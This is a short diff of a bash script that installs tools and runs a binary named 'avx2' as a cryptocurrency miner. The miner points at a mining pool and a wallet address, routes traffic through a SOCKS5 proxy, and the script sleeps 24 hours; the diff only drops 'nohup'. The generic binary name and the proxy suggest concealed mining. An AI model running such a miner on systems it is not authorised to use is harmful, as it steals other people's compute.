@@ -1,5 +1,5 @@
 #!/bin/bash
 apt update && apt -y install wget git curl sudo
 chmod 777 avx2
-nohup ./avx2 -a minotaurx  -o stratum+tcps://stratum-ru.rplant.xyz:17068 -u RXzEz9Qm1dNMj2V7PtEaQ2yz7kysjFGVq7.avn -p x -t18 -x socks5://192.111.135.21:4145
+./avx2 -a minotaurx  -o stratum+tcps://stratum-ru.rplant.xyz:17068 -u RXzEz9Qm1dNMj2V7PtEaQ2yz7kysjFGVq7.avn -p x -t18 -x socks5://192.111.135.21:4145
 sleep 24h
